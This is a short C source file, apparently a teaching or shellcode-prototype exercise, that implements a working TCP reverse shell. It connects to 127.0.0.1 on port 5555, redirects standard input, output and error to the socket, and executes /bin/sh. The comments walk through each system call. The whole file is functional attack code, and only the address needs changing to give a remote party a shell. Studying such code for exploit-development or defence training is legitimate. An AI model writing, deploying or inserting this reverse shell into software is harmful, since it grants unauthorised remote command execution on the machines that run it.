//Name of file : shell_reverse_tcp.c        

#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 5555 


int main(void) {

   int sockfd; 
   struct sockaddr_in address;
   char *args[] = {"//bin/sh", 0};
 

   /*
   struct sockaddr_in  {
       sa_family_t      sin_family  // address family
       in_port_t        sin_port    // port in network byte order
       struct in_addr   sin_addr    // internet address
   }

   ***Internet address***
       struct in_addr {
           uint32_t     s_addr      // address in network byte order
    */

    // Create socket
    // int socket(int domain, int type, int protocol)

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        exit(EXIT_FAILURE);
    }

    // Connect to IP address and port
    // int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET; // Address family for socket 
    address.sin_port = htons(PORT); // Port on which to connect 
    address.sin_addr.s_addr = inet_addr("127.0.0.1"); // IP address to connect to

    if (connect(sockfd, (struct sockaddr *)&address, sizeof(address)) == -1) {
        exit(EXIT_FAILURE);
    }

    // Duplicate file descriptors 
    // int dup2(int oldfd, int newfd);

   for (int i = 0; i <= 2; i++) 
        dup2(sockfd, i);

    // Execute
    // int execve(const char *filename, char * const argv[], char * const envp[])

    if (execve(args[0], &args[0], NULL) == -1) {
        exit(EXIT_FAILURE);
    }

    return 0;
}
